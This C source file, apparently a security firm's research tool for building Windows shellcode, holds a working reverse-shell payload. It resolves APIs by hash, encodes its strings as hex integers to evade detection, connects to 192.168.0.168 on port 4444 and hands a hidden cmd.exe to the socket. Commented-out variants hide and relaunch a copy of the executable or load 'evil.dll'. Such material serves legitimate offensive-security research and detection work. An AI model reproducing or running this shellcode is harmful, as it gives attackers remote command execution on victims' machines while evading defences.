// (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
#include "MiniWin32Api.h"
#include <stdio.h>
#include <stdlib.h>

typedef WINUSERAPI int (WINAPI *MESSAGEBOXA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
typedef WINBASEAPI BOOL (WINAPI *TERMINATEPROCESS)(HANDLE hProcess, UINT uExitCode );
typedef WINBASEAPI BOOL (WINAPI *CREATEPROCESSA)(
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation);
typedef WINBASEAPI BOOL (WINAPI *COPYFILEA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
typedef WINBASEAPI DWORD (WINAPI *GETMODULEFILENAMEA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
typedef void* (__cdecl *MEMCPY)(void* _Dst, void const* _Src, size_t _Size);
typedef void* (__cdecl *MEMSET)(void* _Dst, int _Val, size_t _Size);
typedef VOID (WINAPI *EXITPROCESS)(UINT uExitCode);
typedef int (PASCAL FAR *WSASTARTUP)(WORD wVersionRequired, LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI *WSASOCKETA)(
	int af,
	int type,
	int protocol,
	LPWSAPROTOCOL_INFOA lpProtocolInfo,
	GROUP g,
	DWORD dwFlags);
typedef int (WSAAPI *WSACONNECT)(
	SOCKET s,
	const struct sockaddr FAR * name,
	int namelen,
	LPWSABUF lpCallerData,
	LPWSABUF lpCalleeData,
	LPQOS lpSQOS,
	LPQOS lpGQOS);
typedef BOOL (WINAPI *SETFILEATTRIBUTESA)(
	_In_ LPCSTR lpFileName,
	_In_ DWORD dwFileAttributes);

#define GET_PROC_ADDRESS_HASH 0x83bbda31
#define LOADLIBRARYA_HASH 0x7e1d6602
#define TERMINATE_PROCESS_HASH 0xe3e7dad3
#define CREATE_PROCESSA_HASH 0x5fc6feb1
#define COPY_FILEA_HASH 0x239fbe95
#define GET_MODULE_FILENAMEA_HASH 0x4b5b935a
#define MEMSET_HASH 0x4b416714
#define MEMCPY_HASH 0xa65e4e27
#define EXIT_PROCESS_HASH 0x30843ea2
#define SET_FILE_ATTRIBUTESA 0x9b32a018

#ifdef _M_X64
#define GET_API_ADDRESS_FROM_HASH GetApiAddressFromHash64
#elif defined _M_IX86
#define GET_API_ADDRESS_FROM_HASH GetApiAddressFromHash32
#else
#error This architecture is not supported.
#endif

// #define DEBUG(str) puts(str)
#define DEBUG(str)

__declspec(noinline)
__declspec(code_seg(".scode"))
__declspec(dllexport)
void ShellcodeEntry() {
#if 1
	DEBUG("Initialize");

	CustomLoadLibraryFunc pLoadLibraryA = (CustomLoadLibraryFunc)GET_API_ADDRESS_FROM_HASH(LOADLIBRARYA_HASH);
	CustomGetProcAddressFunc pGetProcAddress = (CustomGetProcAddressFunc)GET_API_ADDRESS_FROM_HASH(GET_PROC_ADDRESS_HASH);
	CREATEPROCESSA pCreateProcessA = (CREATEPROCESSA)GET_API_ADDRESS_FROM_HASH(CREATE_PROCESSA_HASH);
	COPYFILEA pCopyFileA = (COPYFILEA)GET_API_ADDRESS_FROM_HASH(COPY_FILEA_HASH);
	GETMODULEFILENAMEA pGetModuleFileNameA = (GETMODULEFILENAMEA)GET_API_ADDRESS_FROM_HASH(GET_MODULE_FILENAMEA_HASH);
	MEMCPY pMemCpy = (MEMCPY)GET_API_ADDRESS_FROM_HASH(MEMCPY_HASH);
	MEMSET pMemSet = (MEMSET)GET_API_ADDRESS_FROM_HASH(MEMSET_HASH);
	EXITPROCESS pExitProcess = (EXITPROCESS)GET_API_ADDRESS_FROM_HASH(EXIT_PROCESS_HASH);
	SETFILEATTRIBUTESA pSetFileAttributesA = (SETFILEATTRIBUTESA)GET_API_ADDRESS_FROM_HASH(SET_FILE_ATTRIBUTESA);

	// If the suffix of the current module is tmp, it will exit
	// char modulePath[MAX_PATH];
	// char modulePathTmp[MAX_PATH];
	// pMemSet(modulePath, 0, sizeof(modulePath));
	// pMemSet(modulePathTmp, 0, sizeof(modulePathTmp));
	// DWORD len = pGetModuleFileNameA(NULL, modulePath, sizeof(modulePath) / sizeof(modulePath[0]));
	// if (modulePath[len - 3] == 't' && modulePath[len - 2] == 'm' && modulePath[len - 1] == 'p') {
	// 	pExitProcess(0);
	// }

	// Create Copy
	// DEBUG("Create copy");
	// pMemCpy(modulePathTmp, modulePath, len);
	// modulePathTmp[len] = '.';
	// modulePathTmp[len + 1] = 't';
	// modulePathTmp[len + 2] = 'm';
	// modulePathTmp[len + 3] = 'p';
	// modulePathTmp[len + 4] = 0;
	// pCopyFileA(modulePath, modulePathTmp, FALSE);
	// pSetFileAttributesA(modulePathTmp, FILE_ATTRIBUTE_HIDDEN);

	// Run copied executable
	// DEBUG("Run copied executable");
	// STARTUPINFOA si0;
	// pMemSet(&si0, 0, sizeof(si0));
	// si0.cb = sizeof(si0);
	// PROCESS_INFORMATION pi0;
	// pMemSet(&pi0, 0, sizeof(pi0));
	// pCreateProcessA(NULL, modulePathTmp, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si0, &pi0);

	// Launch calc.exe
	// STARTUPINFOA si1;
	// si1.cb = sizeof(si1);
	// pMemSet(&si1, 0, sizeof(si1));
	// PROCESS_INFORMATION pi1 = { 0 };
	// pMemSet(&pi1, 0, sizeof(pi1));
	// const uint32_t calc_exe_str[] = {0x636c6163, 0x6578652e, 0}; // calc.exe
	// pCreateProcessA(NULL, (const char*)calc_exe_str, NULL, NULL, FALSE, 0, NULL, NULL, &si1, &pi1);
	// pExitProcess(0);

	// Load "evil.dll"
	// const uint32_t evil_dll_str[] = {0x6c697665, 0x6c6c642e, 0}; // evil.dll
	// pLoadLibraryA((const char*)evil_dll_str);
	// pExitProcess(0);

	// Create reverse shell
	const uint32_t ws2_32_dll_str[] = {0x5f327377, 0x642e3233, 0x6c6c};
	const uint32_t WSAStartup_str[] = {0x53415357, 0x74726174, 0x7075};
	const uint32_t WSASocketA_str[] = {0x53415357, 0x656b636f, 0x4174};
	const uint32_t WSAConnect_str[] = {0x43415357, 0x656e6e6f, 0x7463};
	const uint32_t cmd_exe_str[] = {0x2e646d63, 0x657865};

	DEBUG("Load library");
	HMODULE ws2_32_base_addr = pLoadLibraryA((const char*)ws2_32_dll_str);

	DEBUG("GetProcAddress");
	WSASTARTUP pWSAStartup = (WSASTARTUP)pGetProcAddress(ws2_32_base_addr, (const char*)WSAStartup_str);
	WSASOCKETA pWSASocketA = (WSASOCKETA)pGetProcAddress(ws2_32_base_addr, (const char*)WSASocketA_str);
	WSACONNECT pWSAConnect = (WSACONNECT)pGetProcAddress(ws2_32_base_addr, (const char*)WSAConnect_str);

	DEBUG("WSAStartup");
	WSADATA wsaData;
	pWSAStartup(MAKEWORD(2, 2), &wsaData);

	DEBUG("WSASocketA");
	SOCKET sock = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = 0x5c11; // htons(4444);
	// addr.sin_addr.s_addr = 0x0100007f; // inet_addr("127.0.0.1")
	addr.sin_addr.s_addr = 0xa800a8c0; // inet_addr("192.168.0.168")
	pWSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

	DEBUG("CreateProcessA");
	STARTUPINFOA si1;
	pMemSet(&si1, 0, sizeof(si1));
	si1.cb = sizeof(si1);
	si1.dwFlags = STARTF_USESTDHANDLES;
	si1.hStdInput = si1.hStdOutput = si1.hStdError = (HANDLE)sock;
	PROCESS_INFORMATION pi1;
	pMemSet(&pi1, 0, sizeof(pi1));
	pCreateProcessA(NULL, (char*)cmd_exe_str, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si1, &pi1);

	// Terminate
	DEBUG("ExitProcess");
	pExitProcess(0);
#else
	// test shellcode for simply showing messagebox
	const uint32_t user32_dll_str[] = { 0x72657375, 0x642e3233, 0x6c6c };
	const uint32_t message_boxa_str[] = { 0x7373654d, 0x42656761, 0x41786f };
	const uint32_t hello_msg_str[] = { 0x6c6c6548, 0x6f };

	CustomGetProcAddressFunc pGetProcAddress = (CustomGetProcAddressFunc)GET_API_ADDRESS_FROM_HASH(GET_PROC_ADDRESS_HASH);
	CustomLoadLibraryFunc pLoadLibraryA = (CustomLoadLibraryFunc)GET_API_ADDRESS_FROM_HASH(LOADLIBRARYA_HASH);
	EXITPROCESS pExitProcess = (EXITPROCESS)GET_API_ADDRESS_FROM_HASH(EXIT_PROCESS_HASH);

	HMODULE user32_base_addr = pLoadLibraryA((const char*)user32_dll_str);
	MESSAGEBOXA pMessageBoxA = (MESSAGEBOXA)pGetProcAddress(user32_base_addr, (const char*)message_boxa_str);
	pMessageBoxA(NULL, (const char*)hello_msg_str, (const char*)hello_msg_str, MB_OK);
	pExitProcess(0);
#endif
}

int main() {
	ShellcodeEntry();
}
